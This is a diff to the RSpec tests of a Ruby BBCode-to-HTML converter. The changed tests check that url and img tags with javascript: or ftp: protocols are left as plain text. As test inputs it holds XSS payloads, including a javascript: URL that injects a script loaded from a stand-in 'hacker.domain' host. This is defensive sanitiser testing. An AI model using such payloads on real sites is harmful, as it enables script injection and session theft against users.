@@ -75,12 +75,12 @@ module Bristlecode
       expect(to_html(input)).to eq(output)
     end
 
-    it 'rejects bad url protocols' do
+    it 'ignores url tags with bad protocols' do
       input = '[url=javascript:alert(1)]google.com[/url]'
-      expect { to_html(input) }.to raise_error
+      expect(to_html(input)).to eq(input)
 
       input = '[url=ftp://something.com/filez]google.com[/url]'
-      expect { to_html(input) }.to raise_error
+      expect(to_html(input)).to eq(input)
     end
 
     it 'allows subtrees in <a> tags' do
@@ -91,19 +91,27 @@ module Bristlecode
 
     it 'rejects bad url protocols' do
       input = "[url=javascript:t=document.createElement('script');t.src='//hacker.domain/script.js';document.body.appendChild(t);//]test[/url]"
-      expect { to_html(input) }.to raise_error
+      expect(to_html(input)).to eq(input)
 
       input = "[url=ftp://whatever.com/etc]warez[/url]"
-      expect { to_html(input) }.to raise_error
+      expect(to_html(input)).to eq(input)
     end
 
     it 'renders a linebreak' do
       expect(to_html('[br]')).to eq('<br>')
     end
 
-    it 'handles images' do
+    it 'renders an image' do
       input = '[img]http://example.com/cat.gif[/img]'
       expect(to_html(input)).to eq('<img src="http://example.com/cat.gif">')
+    end
+
+    it 'ignores bad image src protocols' do
+      input = '[img]javascript:alert(1)[/img]'
+      expect(to_html(input)).to eq(input)
+
+      input = '[img]ftp://example.com/cat.gif[/img]'
+      expect(to_html(input)).to eq(input)
     end
   end
 
@@ -223,11 +231,6 @@ module Bristlecode
       it 'accepts valid image urls' do
         expect(parser.img).to parse('[img]http://example.com/something.gif[/img]')
         expect(parser.img).to parse('[img]https://example.com/something.gif[/img]')
-      end
-
-      it 'rejects bad protocols' do
-        expect(parser.img).not_to parse('[img]ftp://example.com/something.gif[/img]')
-        expect(parser.img).not_to parse('[img]javascript:alert(1);[/img]')
       end
     end
   end
